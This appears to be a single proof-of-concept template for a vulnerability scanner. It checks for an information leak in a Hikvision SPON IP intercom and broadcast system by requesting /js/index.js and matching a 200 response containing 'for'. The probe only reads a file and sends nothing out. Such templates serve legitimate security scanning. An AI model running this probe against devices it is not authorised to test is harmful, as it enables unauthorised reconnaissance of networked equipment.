{
        'name': '海康威视SPON IP网络对讲广播系统index存在信息泄露',
        'poc':[{'requests':{
            'method': 'get',
            'payload': '/js/index.js?t=0.1',
            'headers': {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Language': 'zh-CN,zh;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'close',
                'Upgrade-Insecure-Requests': '1',
                'Cache-Control': 'max-age=0'
            },
            'dnslog': False,
            'sqltime': False,
        },
        'response': {
            'status_code': 200,
            'text': 'for'
        }}]
    }